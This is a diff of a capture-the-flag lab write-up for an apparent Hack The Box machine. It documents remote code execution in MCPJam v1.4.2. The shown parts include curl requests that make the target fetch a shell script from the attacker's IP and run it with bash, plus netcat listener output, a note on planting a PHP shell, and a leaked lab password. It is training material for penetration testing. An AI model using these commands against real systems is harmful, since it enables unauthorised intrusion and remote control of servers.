@@ -120,17 +120,23 @@ bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Dura
 
 ```
 
-MCPJam Version: v1.4.2 is vulnerable
+MCPJam Version: v1.4.2 is vulnerable to RCE:
 Poc: https://github.com/advisories/GHSA-232v-j27c-5pp6
 
 IMAGE 2
 
+---
+## Foothold
+
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"exploit"}'
+  -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"1"}'
 ```
 
+Testing for RCE.
+
+```
 nc -lvnp 1111
 listening on [any] 1111 ...
 connect to [10.10.14.224] from (UNKNOWN) [10.129.59.28] 58440
@@ -140,6 +146,26 @@ User-Agent: Wget/1.21.4
 Accept: */*
 Accept-Encoding: identity
 Connection: Keep-Alive
+```
+
+The listener gets the request back thus confirming the vulerability.
+
+
+
+### Vulnerability
+
+Description of the vulnerability exploited.
+
+### Exploitation
+
+Step-by-step exploitation with commands.
+
+```shell
+# Commands used
+```
+
+---
+## User Flag
 
 ```
 
@@ -152,11 +178,10 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
 10.129.59.28 - - [06/May/2026 18:44:27] "GET /shell.sh HTTP/1.1" 200 -
 ```
 
-Download shell
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"exploit"}'
+  -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"1"}'
   
 ```
 
@@ -165,8 +190,9 @@ execute the shell with a nc active listener
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"exploit"}'
+  -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
 ```
+
 
 enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ (world writable)
 
@@ -202,31 +228,7 @@ pwd = "ComplexP@sswordAdmin1928"
 
 ```
 
-arcane:ComplexP...
 
----
-## Foothold
-
-How you gained initial access to the machine.
-
-### Vulnerability
-
-Description of the vulnerability exploited.
-
-### Exploitation
-
-Step-by-step exploitation with commands.
-
-```shell
-# Commands used
-```
-
----
-## User Flag
-
-### Lateral Movement (if applicable)
-
-Steps to move from initial foothold to user access.
 
 ---
 ## Privilege Escalation
